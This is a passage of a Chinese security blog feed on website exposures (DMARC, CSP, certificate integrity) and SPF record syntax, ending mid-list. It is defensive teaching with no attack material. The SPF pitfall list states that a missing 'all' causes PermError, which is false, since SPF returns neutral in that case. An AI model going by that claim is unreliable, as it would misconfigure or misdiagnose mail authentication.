&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly&quot;&gt;&lt;strong&gt;零基礎資安系列（三）-網站安全三本柱（Secure &amp;amp; SameSite &amp;amp; HttpOnly）&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A&quot;&gt;#&lt;/a&gt; №３ 郵件系統 DMARC 設定&lt;/h2&gt;
&lt;p&gt;排名第三的郵件系統 DMARC 設定，在這個項目裡有大於 70％ 的網站DMARC 設置不全或無設置，&lt;strong&gt;DMARC 會向收件伺服器指示該如何處理特定郵件&lt;/strong&gt;，讓伺服器在收到疑似來自自身機構卻未通過驗證檢查的郵件，或是不符合 DMARC 政策記錄中驗證規定的郵件時，採取合適的處置方式。&lt;/p&gt;
&lt;p&gt;例如無法通過驗證的郵件有兩種，一種是&lt;strong&gt;冒用自身機構名義的郵件&lt;/strong&gt;，另一種則是&lt;strong&gt;從未經驗證的伺服器寄出的郵件&lt;/strong&gt;， DMARC 便會拒絕惡意電子郵件訊息（拒收）或隔離惡意電子郵件訊息（垃圾信件），&lt;strong&gt;強化收件者對未授權郵件的識別&lt;/strong&gt;，藉此&lt;strong&gt;讓社交工程發生的可能性減低&lt;/strong&gt;，是&lt;strong&gt;除了進行社交工程演練以及強化員工資安意識以外很好的防護手段&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DMARC 的設定在近期受重視程度逐漸提高&lt;/strong&gt;，如世界知名顧問公司 Gartner 就在他們的 &lt;a href=&quot;https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/&quot;&gt;list of critical security projects&lt;/a&gt; 中，建議將 DMARC 納入安全評估，而綜合了報告以及測試結果，其實也意味著目前大多數的業者仍是依靠&lt;strong&gt;社交工程演練&lt;/strong&gt;以及&lt;strong&gt;資安訓練&lt;/strong&gt;來作為防範社交工程的手法，但因爲現在的攻擊手法，許多駭客在攻擊前都會利用**「勒索軟體即服務」 （Ransomware-as-a-Service，RaaS）**的方式，降低攻擊技術門檻及成本提高攻擊頻次，而在疫情影響大家逐漸習慣在家工作的情況下，社交工程變得更加防不勝防，靠傳統的方式並不能確保自身不受社交工程的影響。&lt;/p&gt;
&lt;h3 id=&quot;%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-3&quot;&gt;#&lt;/a&gt; 新聞參考：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/145223&quot;&gt;&lt;strong&gt;報導：巴西最大醫療診斷業者Grupo Fleury也遭勒索軟體REvil攻陷&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-3&quot;&gt;#&lt;/a&gt; 初步自我檢視方式&lt;/h3&gt;
&lt;p&gt;在檢視 DMARC 的設定時，其實最大的問題在於沒有設定 DMARC ，而通常檢視自身 DMARC 的設定需要前往網域供應商網站查看 DMARC 的 TXT 記錄：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;登入網域供應商提供的管理控制台。&lt;/li&gt;
&lt;li&gt;找出用於更新網域 DNS TXT 記錄的網頁或資訊主頁。&lt;/li&gt;
&lt;li&gt;查看網域的 DNS TXT 記錄。如果網域已經有 DMARC 記錄，就會看到一筆以 v=DMARC 開頭的 TXT 記錄項目。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;%E5%A6%82%E4%BD%95%E6%AA%A2%E6%9F%A5%E7%8F%BE%E6%9C%89%E7%9A%84-dmarc-%E8%A8%98%E9%8C%84%E5%8F%83%E8%80%83%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A6%82%E4%BD%95%E6%AA%A2%E6%9F%A5%E7%8F%BE%E6%9C%89%E7%9A%84-dmarc-%E8%A8%98%E9%8C%84%E5%8F%83%E8%80%83%EF%BC%9A&quot;&gt;#&lt;/a&gt; 如何檢查現有的 DMARC 記錄參考：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;amp;ref_topic=2759254&quot;&gt;&lt;strong&gt;設定 DMARC 前的注意事項&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №２CSP 未設置或安全等級不足&lt;/h2&gt;
&lt;p&gt;排名第二的CSP 未設置或安全等級不足，在這個項目裡有將近 90% 的網站CSP 未設置或安全等級不足，**網頁內容安全政策 （ Content Security Policy, CSP）**主要是為了防範 &lt;strong&gt;XSS（跨站腳本攻擊）&lt;/strong&gt;，以告知瀏覽器發出的 Request 位置是否受到信任來阻擋非預期的對外連線，加強網站安全性，在 http header 定義限制載入的跨站 script 像是 &lt;code&gt;img-src、script-src&lt;/code&gt;…等這些可以載入外部資源的標籤。&lt;/p&gt;
&lt;p&gt;根據檢測的結果顯示，其實幾乎檢測出有錯誤設置的網站裡都有 &lt;code&gt;unsafe-inline&lt;/code&gt; 以及 &lt;code&gt;unsafe-eval&lt;/code&gt; 的身影，但其實 CSP 是&lt;strong&gt;預設禁止使用 inline script 或 inline CSS 以及 eval 函式&lt;/strong&gt;的。&lt;/p&gt;
&lt;p&gt;以禁止使用 inline script 或 inline CSS 來說，&lt;strong&gt;為了開發時程或是更好的引用第三方套件&lt;/strong&gt;，經常會在 HTML 中寫入 inline 的程式碼，但這種手法也是攻擊者會使用的，然而在瀏覽器並不能確認的情況下，為求安全， CSP 希望以預設禁止的方式讓開發人員將 inline 的程式碼移到外部來避免 HTML 中出現 inline 程式的可能，而禁止 eval 函式是因為雖然 eval （）在開發上有一定的方便性，但也因此容易衍生出 XSS 的風險，所以 &lt;strong&gt;eval 函式與 inline 的程式碼相同，都是被 CSP 預設禁止&lt;/strong&gt;的。&lt;/p&gt;
&lt;p&gt;其實看到這邊應該可以發現，在 CSP 發生錯誤設置的情況基本上會是因為在開發的過程中為了開發上的便利或為了更好的引用第三方套件而導致，不過從實務的角度上來說，這樣的選擇無可厚非，只是該如何在資安以及開發的速度及便利性上取得平衡，無論是在其他針對 XSS 方面補強或更改設置其實都行，因此，在下一篇裡我也會針對這個問題提出一些解決辦法，希望讓大家能夠依據自身的情況去做一些調整。&lt;/p&gt;
&lt;h3 id=&quot;%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-4&quot;&gt;#&lt;/a&gt; 初步自我檢視方式&lt;/h3&gt;
&lt;p&gt;按下 F12 後，點選 Network 在左方開啟想要檢視的檔案，接著選擇 Header 便可以查看是否有設置 CSP 以及 CSP 是否有 unsafe-inline 以及 unsafe-eval 的身影。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-common-risk-exposure/p2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №１網站憑證完整性不足&lt;/h2&gt;
&lt;p&gt;排名第一的網站憑證完整性不足，在這個項目裡有 90% 的完整性不足例如&lt;strong&gt;憑證撤銷機制未設定完整&lt;/strong&gt;或&lt;strong&gt;憑證授權機關資源紀錄檢查&lt;/strong&gt;，在沒有這些設定的情況下業者很難防堵任意數位憑證認證機構擅自簽署網域憑證，而憑證完整性不足的業者中還包含了&lt;strong&gt;使用不安全的加密&lt;/strong&gt;及&lt;strong&gt;過期憑證&lt;/strong&gt;與&lt;strong&gt;過舊的 SSL/TLS 協議&lt;/strong&gt;，以上問題增加了業者在憑證層面可能發生資安事件的風險機率。&lt;/p&gt;
&lt;h3 id=&quot;%E6%86%91%E8%AD%89%E6%92%A4%E9%8A%B7%E6%A9%9F%E5%88%B6%E6%9C%AA%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%95%B4%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%86%91%E8%AD%89%E6%92%A4%E9%8A%B7%E6%A9%9F%E5%88%B6%E6%9C%AA%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%95%B4%EF%BC%9A&quot;&gt;#&lt;/a&gt; &lt;strong&gt;憑證撤銷機制未設定完整：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;可能是未提供 CRL 或 OCSP。 CRL 或 OCSP 為兩種檢查憑證是否被撤銷的方式，用於客戶端驗證伺服器是否可以信任。&lt;/p&gt;
&lt;h3 id=&quot;%E6%86%91%E8%AD%89%E6%8E%88%E6%AC%8A%E6%A9%9F%E9%97%9C%E8%B3%87%E6%BA%90%E7%B4%80%E9%8C%84%E6%AA%A2%E6%9F%A5%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%86%91%E8%AD%89%E6%8E%88%E6%AC%8A%E6%A9%9F%E9%97%9C%E8%B3%87%E6%BA%90%E7%B4%80%E9%8C%84%E6%AA%A2%E6%9F%A5%EF%BC%9A&quot;&gt;#&lt;/a&gt; &lt;strong&gt;憑證授權機關資源紀錄檢查：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;授權某 CA 為某機構發行憑證的 DNS 紀錄，能確保只有授權的 CA 能為業者的網域發行憑證，防止任意 CA 擅自簽署網域的憑證。&lt;/p&gt;
&lt;h3 id=&quot;%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%9A&quot;&gt;#&lt;/a&gt; &lt;strong&gt;使用不安全的加密：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;可能是低強度加密套件使用已知且公開的演算法進行資料混淆或是過舊已被破解的加密法。&lt;/p&gt;
&lt;h3 id=&quot;%E6%86%91%E8%AD%89%E9%81%8E%E6%9C%9F%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%86%91%E8%AD%89%E9%81%8E%E6%9C%9F%EF%BC%9A&quot;&gt;#&lt;/a&gt; &lt;strong&gt;憑證過期：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;憑證不合法、已過期、或是被撤銷而失效。&lt;/p&gt;
&lt;h3 id=&quot;%E9%81%8E%E8%88%8A%E7%9A%84-ssl%2Ftls-%E5%8D%94%E8%AD%B0%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%81%8E%E8%88%8A%E7%9A%84-ssl%2Ftls-%E5%8D%94%E8%AD%B0%EF%BC%9A&quot;&gt;#&lt;/a&gt; &lt;strong&gt;過舊的 SSL/TLS 協議：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;SSL（ Secure Sockets Layer）安全通訊端層，可以用於保持網際網路連線安全防止系統之間的敏感資料被駭客讀取甚至修改任何傳輸資訊。&lt;br&gt;
 TLS（ Transport Layer Security）傳輸層安全性，取代 SSL 的加密協定，比 起 SSL 能提供更高更安全的連線。&lt;/p&gt;
&lt;p&gt;而使用過舊或已廢棄的協議可能導致駭客利用已知漏洞竊取傳輸中的機敏資料。&lt;/p&gt;
&lt;h3 id=&quot;%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-5&quot;&gt;#&lt;/a&gt; 初步自我檢視方式&lt;/h3&gt;
&lt;p&gt;以 Chrome 為例，點擊網址左方小鎖頭可以看到目前是否為安全連線以及憑證是否有效，點選憑證後可以看見憑證詳細資訊，在 github 上也有提供許多憑證測試工具，可以根據需求選擇工具或是針對工具進行調整。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-common-risk-exposure/p3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-common-risk-exposure/p4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E5%B0%8F%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B0%8F%E7%B5%90&quot;&gt;#&lt;/a&gt; 小結&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;常見曝險的發生原因大致有兩種&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;為了方便業者使用所以有些網頁應用或伺服器端的預設值會以可用性為優先進行考量，也因此當許多的業者直接採用預設值而未進行配置檢視時，很有可能因此產生風險。&lt;/li&gt;
&lt;li&gt;有時業者爲了更好的在網站中使用第三方套件或者是開發時程吃緊的緣故而採用了不安全的配置使風險產生。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;綜合上述兩點，其實在沒有進行過評估或是執行風險管理的情況下，很容易衍生曝險使網站成為攻擊目標，上述是目前發生比例大於 50 % 的網路曝險說明及非常初步的自我檢測方式，如果希望能更精確的針對自身網站的風險進行評估及管理的話，建議可以以文中的關鍵字去搜尋相關工具進行檢測。&lt;/p&gt;
&lt;p&gt;但若希望省時且擔心&lt;strong&gt;檢測出問題不知道該如何修復&lt;/strong&gt;或是&lt;strong&gt;修復問題的 CP 值該如何衡量&lt;/strong&gt;的話，可以尋找相關的資安服務進行曝險評估。&lt;/p&gt;
&lt;p&gt;以自身為例，Cymetrics 便有提供網站資安曝險評估的服務，包含&lt;strong&gt;實時風險情資調整評級權重&lt;/strong&gt;以及&lt;strong&gt;關鍵字形式的全中文風險建議&lt;/strong&gt;及&lt;strong&gt;複雜度改善評級象限&lt;/strong&gt;的資安服務，如果有相關的資安需求也歡迎將 Cymetrics 的產品列入比較。&lt;/p&gt;
&lt;h2 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A&quot;&gt;#&lt;/a&gt; 延伸閱讀：&lt;/h2&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery ）&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery&quot;&gt;認識 CSRF（Cross Site Request Forgery）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;認識 XSS（Cross-Site Scripting）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E4%B8%89%E6%9C%AC%E6%9F%B1%EF%BC%88secure-%26-samesite-%26-httponly%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E4%B8%89%E6%9C%AC%E6%9F%B1%EF%BC%88secure-%26-samesite-%26-httponly%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（三）-網站安全三本柱（Secure &amp;amp; SameSite &amp;amp; HttpOnly）&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly/&quot;&gt;網站安全三本柱（Secure &amp;amp; SameSite &amp;amp; HttpOnly）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A&quot;&gt;#&lt;/a&gt; &lt;strong&gt;參考資料：&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;x-frame-options%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#x-frame-options%EF%BC%9A&quot;&gt;#&lt;/a&gt; X-Frame-Options：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options#%E4%BD%BF%E7%94%A8_x-frame-options&quot;&gt;https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;gartner-list-of-critical-security-projects%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#gartner-list-of-critical-security-projects%EF%BC%9A&quot;&gt;#&lt;/a&gt; Gartner list of critical security projects：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/&quot;&gt;https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;dmarc%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dmarc%EF%BC%9A&quot;&gt;#&lt;/a&gt; DMARC：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;amp;ref_topic=2759254&quot;&gt;https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;amp;ref_topic=2759254&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>關於 email security 的大小事 — 設定篇 SPF</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/"/>
		<updated>2021-07-14T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;上一次我們深入瞭解了 email security 的原理與應用場景，這次來看看 SPF、DKIM、DMARC 該如何設置吧！&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;請注意，這裡的『設定』並不是回答你『如何在 google 或是 Office365 設好這些紀錄』、『用 XX 服務結果信寄不到怎麼辦』，這種操作配置的教學文請參考官方文件，畢竟 email provider 千千百百家，各自可能有的問題更是難以彙整。&lt;/p&gt;
&lt;p&gt;我想告訴你的『設定』是 SPF、DMARC 的 DNS 紀錄本身有哪些標籤，以及設置這些選項時可能不小心踩到哪些地雷，導致收信方的 email server 在驗證你的郵件時出現非預期地報錯，而判斷驗證失敗。另外，也會告訴你如果有多個子網域，或有使用第三方寄信服務時該怎麼辦。&lt;/p&gt;
&lt;p&gt;總之，可以想成是回答你『我該怎麼理解這些紀錄』和『每個機制有哪些選項跟限制』，而不是針對單一 email provider 的教學文。&lt;/p&gt;
&lt;p&gt;如果你還不太懂 SPF、DKIM、DMARC 是什麼，或是不清楚郵件傳遞過程中的各個角色與職責（MDA、MTA⋯⋯們），或是想了解更多範例與延伸議題，請看本系列其他篇：&lt;/p&gt;
&lt;p&gt;有不懂或是想了解更多範例與延伸議題，請看本系列其他篇～&lt;br&gt;
如果你還不太懂 SPF、DKIM、DMARC 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory&quot;&gt;關於 email security 的大小事 — 原理篇&lt;/a&gt;&lt;br&gt;
如果你在找 DKIM、DMARC 的設定 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc&quot;&gt;關於 email security 的大小事 — 設定篇 DKIM、DMARC&lt;/a&gt;&lt;br&gt;
如果你想搭配設定範例 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples&quot;&gt;關於 email security 的大小事 — 範例篇&lt;/a&gt;&lt;br&gt;
如果你想了解延伸議題 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra&quot;&gt;關於 email security 的大小事 — 延伸篇&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;spf&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#spf&quot;&gt;#&lt;/a&gt; SPF&lt;/h2&gt;
&lt;p&gt;先來看看 SPF。SPF 紀錄的語法說複雜不複雜，但各種小細節常常讓人頭疼，一個很完整的語法介紹可以參考 &lt;a href=&quot;https://dmarcian.com/spf-syntax-table&quot;&gt;Dmarcian-SPF record syntax&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;如果想配著真實的信件看，建議你可以用 &lt;a href=&quot;https://mxtoolbox.com/SuperTool.aspx&quot;&gt;mxtoolbox&lt;/a&gt; 之類的工具一邊查詢 SPF 紀錄，一邊點開信件原始內容看 SPF 驗證結果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-settings-spf/spf-result.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;這裡我們先講一下 SPF 驗證時會出現的幾種結果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Pass&lt;/code&gt;：IP 於列表中，驗證成功。採取行為是：accept&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Fail&lt;/code&gt;：IP 不在列表中，驗證失敗。採取行為是：reject&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SoftFail&lt;/code&gt;：IP 不在列表中，驗證失敗，但不要直接 reject。採取行為是：accept but mark（標注失敗）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Neutral&lt;/code&gt;：不予置評，即使 IP 不在列表中也不視為失敗，視同 &lt;code&gt;None&lt;/code&gt;。採取行為是：accept&lt;/li&gt;
&lt;li&gt;&lt;code&gt;None&lt;/code&gt;：沒有足夠資訊得出結論（例如未找到 SPF 紀錄）。採取行為是：accept&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PermError&lt;/code&gt;：驗證過程出錯，例如格式錯誤的 SPF 紀錄。採取行為是：unspecified（未定義），交由收信方 email server 自行決定。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TempError&lt;/code&gt;：驗證過程出錯，但沒有 PermError 嚴重。採取行為可能是 accept 或暫時 reject，由收信方 email server 自行決定。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SPF 的小地雷就在於，很多種設置上的小失誤可能導致 PermError、TempError、或是其他削弱 SPF 安全性的結果。因為我們無法預期收信方 email server 會採取什麼行為，所以也無法確保送到收件人手上的信件都有受到 SPF 紀錄的保護。要是對方遇到 Error 一律採取 accept，或是乾脆選擇忽略這筆 SPF 紀錄，那不就形同虛設了嗎？&lt;/p&gt;
&lt;p&gt;下面我們看看 SPF 紀錄中的標籤： 8 個機制（mechanism）跟 2 種修飾（modifier），以及他們可能踩到地雷的情形。所有的標籤（tag）與標籤值（tag value）中間都不能有空白。此外，至少在出現更新版本的 SPF spec之前，現階段 SPF 紀錄開頭必須是 &lt;code&gt;v=spf1&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/spf.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;簡短的 SPF record（取自 維基百科）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;以下我們稱信件的來源（也就是 &lt;code&gt;smtp.MailFrom&lt;/code&gt;）為 sender-domain 或 sender-ip，標籤值為 target-domain 或 target-ip。&lt;/p&gt;
&lt;h3 id=&quot;mechanisms&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#mechanisms&quot;&gt;#&lt;/a&gt; Mechanisms&lt;/h3&gt;
&lt;p&gt;8 個 mechanism 為： &lt;code&gt;all, ip4, ip6, a, mx, ptr, exists, include&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SPF 紀錄驗證時是照著 mechanism 出現的順序比對的，比對結果為 match、 not-match、或 error 之一，一旦成功找到 match 或是發生 error 就會停下。&lt;/p&gt;
&lt;p&gt;在每個 mechanism 前都可能帶有一個 qualifier 符號，為下列其一：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pass(+)&lt;/code&gt;：若對到 sender-ip，結果 pass（即白名單）。預設值，可以省略（ &lt;code&gt;+all&lt;/code&gt; 同 &lt;code&gt;all&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;neutral(?)&lt;/code&gt;：None ，等同沒有 policy。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;softfail(~)&lt;/code&gt;：若對到 sender-ip，結果 fail，仍要標注並接受。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fail(-)&lt;/code&gt;：若對到 sender-ip，結果 fail（即黑名單）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;all&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#all&quot;&gt;#&lt;/a&gt; all&lt;/h5&gt;
&lt;p&gt;語法為： &lt;code&gt;[qualifier]all&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;必須在紀錄最末，是最後一個判斷條件。一般來說應設置最嚴謹的 &lt;code&gt;-all&lt;/code&gt;，表示除了前述 mechanism 指定的 target IP 外一律拒絕（&lt;code&gt;fail(-)&lt;/code&gt;），所以如果前面的 mechanism 都沒對到，最後就會失敗。&lt;/p&gt;
&lt;p&gt;地雷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;缺少 &lt;code&gt;all&lt;/code&gt;：&lt;code&gt;PermError&lt;/code&gt;&lt;/li&gt;
